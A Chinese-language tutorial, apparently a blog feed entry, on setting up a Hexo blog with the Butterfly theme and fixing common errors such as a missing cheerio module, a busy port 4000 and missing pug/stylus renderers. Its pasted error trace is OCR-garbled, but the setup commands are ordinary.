    <content><![CDATA[<h1 id="官网地址：https-hexo-io-zh-cn"><a href="#官网地址：https-hexo-io-zh-cn" class="headerlink" title="官网地址：https://hexo.io/zh-cn/"></a>官网地址：<a href="https://hexo.io/zh-cn/">https://hexo.io/zh-cn/</a></h1><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="1-node"><a href="#1-node" class="headerlink" title="1.node"></a>1.<a href="https://nodejs.org/en/">node</a></h2><h2 id="2-git"><a href="#2-git" class="headerlink" title="2.git"></a>2.<a href="https://git-scm.com/downloads">git</a></h2><h1 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
<h2 id="初始化-hexo"><a href="#初始化-hexo" class="headerlink" title="初始化 hexo"></a>初始化 hexo</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
<h2 id="工程配置"><a href="#工程配置" class="headerlink" title="工程配置"></a>工程配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
<h2 id="浏览器调试"><a href="#浏览器调试" class="headerlink" title="浏览器调试"></a>浏览器调试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<h1 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h1><h2 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br></pre></td></tr></table></figure>
<h2 id="修改站点配置文件-config-yml-把主题修改为-Butterfly"><a href="#修改站点配置文件-config-yml-把主题修改为-Butterfly" class="headerlink" title="修改站点配置文件_config.yml,把主题修改为 Butterfly"></a>修改站点配置文件_config.yml,把主题修改为 Butterfly</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: Butterfly</span><br></pre></td></tr></table></figure>
<p>为便于后续平滑升级，在source目录下创建_data文件夹,将Themes&#x2F;Butterfly目录下的     _config.yml复制一份到source&#x2F;_data目录下,并改名为butterfly.yml<br>执行以下指令,以查看应用主题后的效果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean #清除旧的内容</span><br><span class="line">hexo g #生成发布用的静态页面</span><br></pre></td></tr></table></figure>
<h1 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h1><h2 id="错误1：如果第一次操作，可能会报以下的错误"><a href="#错误1：如果第一次操作，可能会报以下的错误" class="headerlink" title="错误1：如果第一次操作，可能会报以下的错误"></a>错误1：如果第一次操作，可能会报以下的错误</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C: B1og)hexo g</span><br><span class="line">INFO Start processing</span><br><span class="line">FATAL Something s wrong. Maybe you can find the solution here: https:l /hexo. io/ docs/ troub1 eshooting. htm1</span><br><span class="line">Error: Cannot find module cheeri 0</span><br><span class="line">Require stack :</span><br><span class="line">C: B1 og themes But terflyscripts photo. js</span><br><span class="line">at Functi on. Module._ reso1veF ilename (internal / modul es/cjs/loader. js:797:15)</span><br><span class="line">at Functi on. Module._ load (internal 1 modul es/cjs/ loader. js:690:27)</span><br><span class="line">at Module. require (internal 1 modul es/c js/loader. js:852: 19)</span><br><span class="line">at require (C: B1og node_ modul es hexo)1ib hexolindex. js :280:23)</span><br><span class="line">at Hexo. (anonymous) (C: B1og themes Butterfly scripts photo. js:5: 19)</span><br><span class="line">at Hexo. tryCatcher (C: B1og node_ modul es b1uebirdljs release util. js:16:23)</span><br><span class="line">at Hexo. (anonymous) (C: B1og node_ modul es b1uebirdljs release method. js:15 :34)</span><br><span class="line">at C: B1 og node modul es hexo1ib extendlfilter. js:62:52</span><br><span class="line">at tryCatcher (C: B1og node_ modul es b1uebirdljs release util. js:16:23)</span><br><span class="line">at 0bject. gotValue (C: )B1og node_ modul es bluebird,js release reduce. js: 166:18)</span><br><span class="line">at 0bject. gotAccum (C: B1og node_ modul es b1uebird,js release reduce. js: 155:25 )</span><br><span class="line">at 0bject. tryCatcher (C: B1 og node_ modul es bluebirdljs releaseutil. js: 16:23)</span><br><span class="line">at Promise. sett1 ePromi seF romHandler (C: B1og node_ modul es b1uebirdjs rel ease promi se. js:547:31)</span><br><span class="line">at Promise. settlePromise (C: B1og node_ modul es bluebirdljs release promise. js :604: 18)</span><br><span class="line">at Promise. settlePromi se0 (C: B1og node_ modul es bluebird,js rel ease promise. js :649: 10)</span><br><span class="line">at Promise. settlePromises (C: B1og node_ modul es b1uebirdljs release promi se. js:729:18)</span><br><span class="line">at_ drainQueueStep (C: B1 og node_ modul es b1uebirdkjs release async. js:93:12)</span><br><span class="line">at drainQueue (C: B1og node_ modul es b1uebird,js release lasync. js:86:9)</span><br><span class="line">at Async._ drainQueues (C: )B1 og node_ modul es bluebirdljs re1 ease lasync. js: 102:5)</span><br><span class="line">at Immedi ate. Async. drainQueues [as onI mmediate] (C: B1og node_ modul es b1uebirdlisrelease)async. js:15:14)</span><br><span class="line">at processImmediate (internal/ timers. js: 439:21)</span><br></pre></td></tr></table></figure>
<p>解决方案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install cheerio@0.22.0 --save</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<h2 id="错误2-hexo搭建博客过程中出现的问题，4000端口被占用"><a href="#错误2-hexo搭建博客过程中出现的问题，4000端口被占用" class="headerlink" title="错误2: hexo搭建博客过程中出现的问题，4000端口被占用"></a>错误2: hexo搭建博客过程中出现的问题，4000端口被占用</h2><p>解决方案<br>可以在_config.yml内加上如下代码更改hexo-server运行时的端口号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 4001  #可以改为任意端口</span><br><span class="line">  compress: true</span><br><span class="line">  header: true</span><br></pre></td></tr></table></figure>
<h2 id="错误3：如果你沒有-pug-以及-stylus-的渲染器会报错"><a href="#错误3：如果你沒有-pug-以及-stylus-的渲染器会报错" class="headerlink" title="错误3：如果你沒有 pug 以及 stylus 的渲染器会报错"></a>错误3：如果你沒有 pug 以及 stylus 的渲染器会报错</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extends includes/layout.pug block content include ./includes/mixins/post-ui</span><br><span class="line">.pug #recent-posts.recent-posts +postUI include includes/pagination.pug</span><br></pre></td></tr></table></figure>
<p>解决方案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br><span class="line">npm install hexo-deployer-git --save / yarn add hexo-deployer-git</span><br></pre></td></tr></table></figure>
<p>再次依次执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
